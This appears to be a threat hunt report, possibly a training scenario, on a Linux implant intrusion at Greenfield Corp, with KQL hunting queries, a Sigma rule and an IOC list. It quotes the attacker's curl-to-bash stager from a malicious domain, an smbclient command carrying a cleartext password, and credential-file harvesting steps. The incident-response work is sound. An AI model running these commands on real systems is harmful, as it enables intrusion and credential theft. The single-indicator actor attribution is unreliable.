# Threat Hunt Report: GHOST IN THE STACK

## Document Control
* **Organization:** Greenfield Corp
* **Classification:** TLP:RED | CONFIDENTIAL
* **Incident Window:** 2026-04-30 21:54 UTC — 2026-05-01 04:00 UTC
* **Report Date:** 2026-05-23

---

## Executive Summary
On 30 April 2026, a threat operator gained initial access to `GF-DEV01` via a supply-chain style dropper disguised as a software update. The operator maintained a covert presence for approximately 105 minutes before escalating to interactive access using harvested SSH credentials, subsequently attempting lateral movement across the Greenfield domain. 

* **Affected Host:** GF-DEV01
* **Compromised Accounts:** `a.kumar` (initial), `sancadmin` (SSH harvested), `t.harris` (SSH harvested)
* **Implant:** `helix-update` (Sliver-based C2 implant)
* **Dwell Time:** 105 minutes (implant detach to first operator SSH)
* **Attribution Signal:** SSH key comment: `octotempest@operator`
* **C2 Infrastructure:** `dl.abordsecurity.space` / `sync.abordsecurity.space` / `194.36.110.139:9080`
* **Lateral Movement Outcome:** FAILED — SMB, WinRM access denied; WMI no process evidence
* **Implant Status at Shift End:** **LIVE** — immediate Incident Response action required

---

## Incident Timeline

| Time (UTC) | Event | Host |
| :--- | :--- | :--- |
| **21:50** | `CLOSED-5` fires — DNS query to suspicious domain (misclassified as FP) | GF-DEV01 |
| **21:54:56** | `a.kumar` runs: `curl -fsSL https://dl.abordsecurity.space/install.sh \| bash` | GF-DEV01 |
| **21:54:57** | `install.sh` executes: `chmod`, `curl` (implant download), `nohup` (background launch) | GF-DEV01 |
| **21:55** | `helix-update` launches (PID 34616, PPID 1 / systemd-reparented) | GF-DEV01 |
| **21:55–23:39** | Implant beacons via npm/node processes (PIDs 34739, 35250, 43047) to `104.16.x.x/16` | GF-DEV01 |
| **~22:xx** | Implant reads `ssh_user_keys`, `kube_creds`, `aws_creds`, `claude_data` | GF-DEV01 |
| **23:29:47** | `sancadmin` logs in via SSH from `194.36.110.139` (AS9009 / M247 hosting) | GF-DEV01 |
| **23:29:47** | `sancadmin` drops files via `/usr/lib/openssh/sftp-server` (2 new binaries) | GF-DEV01 |
| **23:39** | `sancadmin` begins pivot attempts: Ligolo, SMB, WinRM, WMI | GF-DEV01 → Internal |
| **~23:48** | SAMR access via `t.harris` from `10.1.0.133` to `GF-DC01` (user enumeration) | GF-DC01 |
| **~23:51** | `sancadmin` runs smbclient with `t.harris` credential in clear text (`Summer2025!`) | GF-DEV01 |
| **00:10–00:15** | `t.harris` RDP lands on `WS01` via SSH tunnel through `GF-DEV01` (`10.1.0.133:3389`) | WS01 |
| **00:21** | `sancadmin` pings C2 infra on odd port: `194.36.110.139:9080` | GF-DEV01 |
| **~00:xx** | Operator stages `helix-build-agent.exe` in `$env:TEMP\hbsync.exe` via encoded PS payload | GF-DEV01 |

---

## Technical Analysis & Triage

### 1. Initial Access & Implant Deployment
The initial infection chain was triggered under the context of user account `a.kumar`. The user executed a piped terminal command that immediately established a footprint on the server:

```bash
curl -fsSL [https://dl.abordsecurity.space/install.sh](https://dl.abordsecurity.space/install.sh) | bash
```
---
The execution of install.sh inside the subshell completed three sequential actions to deploy the implant:

chmod: Granted execution permissions to the downloaded binary.

curl: Downloaded the compiled helix-update implant payload.

nohup: Launched the implant detached from the active terminal session to ensure persistence upon shell termination.

Process Tree Forensics
By analyzing the execution tree, we trace two distinct curl events down from the interactive shell into the detached background processes:
```
 PID 32260 (bash) ──> PID 34608 (subshell) ──> PID 34609 (curl)
```
---
Hunting Query (Linux Process Execution)

``` kql
LinuxProcess_CL
| where TimeGenerated between (datetime(2026-04-30 21:54:50) .. datetime(2026-04-30 21:55:30))
| project TimeGenerated, ActingProcessId, ActingProcessName, ActingProcessCommandLine, TargetProcessId, TargetProcessCommandLine, ActorUsername
| order by TimeGenerated asc
```
---
Implant Behavior & C2 Evasion Mechanics
Process Identity
The implant decoupled from the user's interactive shell session and was automatically reparented directly to systemd:

* Target Process ID (PID): 34616

* Parent Process ID (PPID): 1 (systemd)
``` kql
LinuxProcess_CL
| where TimeGenerated between (datetime(2026-04-30 21:54:50) .. datetime(2026-04-30 21:55:30))
| where DvcHostname in ("GF-DEV01")
| where TargetProcessCommandLine contains "update"
| project TimeGenerated, ActingProcessId, ActingProcessName, ActingProcessCommandLine, TargetProcessId, TargetProcessName, TargetProcessCommandLine, ActorUsername, DvcHostname
| order by TimeGenerated asc
```
---
# Network Traffic Masquerading
The helix-update binary exposed zero direct network traffic under its own process name. Instead, it proxied outbound command and control (C2) traffic through legitimate infrastructure processes to blend into baseline developer environments:
* PID 34739 $\longrightarrow$ Outbound connections to 104.16.x.x (Beacon count: ~14)
* PID 35250 $\longrightarrow$ Outbound connections to 104.16.0.34 (Beacon count: 15)
* PID 43047 $\longrightarrow$ Outbound connections to 104.16.4.34 (Beacon count: 12)

  All carrier processes generated uniform beaconing patterns heading out to a shared /16 Cloudflare CDN range. Because this network relies on shared multi-tenant architecture, blocking the destination IP at the perimeter level would result in massive collateral damage. Domain-level block rules (dl.abordsecurity.space, sync.abordsecurity.space) are strictly required.

``` kql
LinuxNetwork_CL
| where TimeGenerated between (datetime(2026-04-30 21:54:00) .. datetime(2026-05-01 04:00:00))
| where DvcHostname == "GF-DEV01"
| where NetworkDirection == "Outbound"
| summarize count() by ActingProcessId, DstIpAddr
| order by ActingProcessId asc
```
---
# Operator Playbook & Target Data Mapping
Cross-referencing telemetry in LinuxSyscall_CL, LinuxProcess_CL, and LinuxFile_CL reveals that the operator executed systemic credential collection across cloud and identity stores:

| Executing Utility | Target File / Resource | Harvested Identity |
| :--- | :--- | :--- |
| **aws** | aws_creds | AWS Cloud CLI Credentials |
| **bash** | ssh_user_keys | SSH Local Private Keys |
| **kubectl** | kube_creds | Kubernetes Cluster Access Tokens |
| **ssh** | ssh_user_keys | Private Keys for Lateral Movement |

* The implant binary itself systematically targets and performs high-frequency read loops on local data stored within claude_data
---
``` kql
// Audit tool execution and file tampering
union LinuxProcess_CL, LinuxFile_CL
| where TimeGenerated >= datetime(2026-04-30 21:45)
| where ActingProcessId in ("34616", "34739", "35250", "43047") or TargetProcessId in ("34616", "34739", "35250", "43047")
| project TimeGenerated, Type, ActingProcessId, ActingProcessName, ActingProcessFilePath, TargetProcessFilePath, TargetFileName, TargetFilePath, TargetProcessName, TargetProcessCurrentDirectory
| order by TimeGenerated asc

// Isolate high-frequency file interaction via Syscalls
LinuxSyscall_CL
| where TimeGenerated >= datetime(2026-04-30 21:45)
| where Comm == "helix-update"
```
# Session Analysis & Lateral Movement
Activity Stream Differentiation
During the compromise window (21:54 to 23:09 UTC), two separate activity streams were executing concurrently on GF-DEV01. To explicitly separate standard administrative sessions from the operator's covert activity, the following field validations must be applied:

* Normal Stream Target: ShellUser (Captured via LinuxShellHistory_CL)

* Malicious Stream Target: ActorUsername (Captured via LinuxProcess_CL)
Ingress & Threat Group Attribution
At 23:29:47 UTC, an anomalous external inbound SSH session landed on the sancadmin account. The session originated from IP 194.36.110.139 (routing through AS9009 - M247 Hosting), executing completely outside normal hours of operation.

Once authenticated, the operator modified the local .ssh/authorized_keys file to inject a persistent public key. Advanced endpoint hunting extracted the definitive comment metadata string:
```
octotempest@operator
```
🌟 Threat Intel Note: This explicit key comment string serves as a high-confidence, single-source attribution indicator pinning this campaign directly to the Octo Tempest (Scattered Spider) actor group.
``` kql
// Identify the anomalous ingress session
LinuxAuth_CL
| where TimeGenerated between (startofday(datetime(2026-04-30)) .. endofday(datetime(2026-04-30)))
| where DvcHostname == "GF-DEV01" and TargetUsername == "sancadmin" and EventResult == "Success"

// Extract public key modifications from the EDR layer
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-04-30 21:54:00) .. datetime(2026-05-01 04:00:00))
| where ProcessCommandLine has "authorized_keys"
| project TimeGenerated, InitiatingProcessAccountName, ProcessCommandLine
```
---
# Windows Pivot Mechanics
Because the adversary's staging infrastructure could not reach the Windows server environment (WS01) directly, they used GF-DEV01 as an operational pivot point, establishing an outbound SSH tunnel to forward remote desktop traffic straight to 10.1.0.133:3389.

Once across the tunnel, the operator initiated active directory discovery from WS01 targeting the primary domain controller (GF-DC01), performing SAMR User Enumeration (MITRE T1087.002) via the IPC$/samr interface share.
``` kql
// Trace outbound tunneling configurations
LinuxAuth_CL
| where TimeGenerated between (datetime(2026-04-30 21:00) .. datetime(2026-05-01 04:00))
| where DvcHostname has "DEV01" or Dvc has "DEV01"
| where SudoCommand has "ssh" or SudoCommand has "10.1.0.133"

// Isolate Active Directory SAMR User Enumeration
SecurityEvent
| where TimeGenerated between (datetime(2026-04-30T23:48:00Z) .. datetime(2026-04-30T23:49:00Z))
| where IpAddress == "10.1.0.133"
| where Computer contains "GF-DC01" and Account contains "t.harris"
| where EventID == 5145 and ShareName has_any ("\\\\*\\ADMIN$", "\\\\*\\C$", "\\\\*\\IPC$") and RelativeTargetName == "samr"
| project Activity, IpAddress, ObjectType, RelativeTargetName, ShareName, AccessMask
```
# Cleartext Privilege Escalation Attempt
A severe operator operational security (OPSEC) failure occurred at 23:51 UTC, when the adversary executed an explicit smbclient sequence passing raw user credentials in plaintext across the terminal interface:
```
smbclient -U greenfield.local/t.harris%Summer2025!
```
The operator systematically looped five iterative variations of this configuration, testing write access escalation states:

* -L flag: Checked overall network access permissions and directory enumeration.

* /Users: Evaluated standard shared directories for directory write capabilities.

* /C$: Attempted to write directly to administrative roots to verify domain admin equivalence.

* /Windows\Temp: Tested file dropping capabilities into protected operating system folders.

* Final Outcome: FAILED. Traditional authentication handshakes failed across SMB and WinRM channels (rc=1), and while WMI executed (rc=0), no persistent downstream Windows process execution could be verified on the host.
---
# Detection Engineering (Sigma Rule Configuration)
To track systemd-reparented implant structures like the one executed in this intrusion, deploy the following high-fidelity analytic rule:
```
title: Sliver Implant Execution via Systemd Reparenting
id: 4fbc3b50-3226-4091-a129-dfcf591abb4d
status: stable
description: Detects process creation patterns where compiled binaries (such as Sliver or custom C2 implants) drop background execution tasks and are automatically reparented to the system init daemon (PPID 1).
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        Image|endswith: '/helix-update'
        ParentImage: '/sbin/init'
    condition: selection
falsepositives:
    - Custom system engineering scripts or monitoring software intentionally backgrounded during startup.
level: high
```
# Containment & Remediation Plan
🚨 CRITICAL STATUS: The primary helix-update implant remains actively running on GF-DEV01. Immediate host containment and isolation must be executed by the Incident Response Team.

File Removal Directory Tracking
The following seven files, configurations, and persistence pathways must be permanently excised from the server:
| Host File System Path | Artifact Purpose | Primary Forensic Log |
| :--- | :--- | :--- |
| **/tmp/helix-update** |	Core Active C2 Implant Binary |	LinuxFile_CL |
| **/tmp/helix-sync** |	Secondary Implant Module | LinuxFile_CL |
| **/tmp/hbsync.exe** |	Staged Windows Payload | Executable	LinuxFile_CL |
| **/tmp/wmi_exec.py** |	Lateral Movement Execution Script |	LinuxFile_CL |
| **/usr/local/bin/helix-sync** |	Persistent Execution Binary Pathway |	LinuxShellHistory_CL |
| **/etc/systemd/system/helix-sync.service** |	Persistent System Startup Daemon Configuration | LinuxShellHistory_CL |
| **/home/a.kumar/.ssh/authorized_keys** |	Backdoored Adversary Authentication Public Key |	Syslog |

Live Artifact Disposition at Shift Close
* helix-sync (service): Persistent (Maintained via systemd configurations to trigger automatic restart on system reboots).

* helix-update: Running (Active runtime footprint inside the memory stack, actively sending beacon traffic).

* hbsync.exe: Dormant (Static payload binary resting inside the temporary storage partition; no active execution loops observed).
---
# Indicators of Compromise (IOC) Watchlist
| Type | Target Indicator | Threat Context | Recommended Security Action |
| :--- | :--- | :--- | :--- |
| **Domain** |	dl.abordsecurity.space |	Malicious Stager Script & Implant Hosting |	Strict DNS Boundary Block |
| **Domain** |	sync.abordsecurity.space |	Secondary Staging Infrastructure Gateway |	Strict DNS Boundary Block |
| **IP Address** |	194.36.110.139 |	Interactive Operator Ingress Vector (SSH) |	SIEM Watchlist + Perimeter Ingress Block |
| **Network Socket** |	194.36.110.139:9080 |	Outbound Custom Non-Standard C2 Beaconing | Perimeter Port Level Network Block |
| **IP Network Range** |	104.16.x.x/16 |	Cloudflare Shared CDN Beaconing Vectors |	Domain-level blocks only (Shared CDN IP) |
| **SSH Comment String** |	octotempest@operator |	Explicit Threat Actor Signature Identity |	Dynamic Rule Threat Intel Signature Target |
| **User Identity** |	t.harris / Summer2025! |	Cleartext Domain Account Credential Leak |	Mandatory Domain Reset + Session Invalidation |
| **Process File** |	helix-update |	Compiled Sliver Core C2 Binary Implant |	Endpoint Isolation + Hash Block Deployment |
| **Process File** |	helix-build-agent.exe | Staged Portable Windows Binary |	File Removal + EDR Sandbox Scanning |






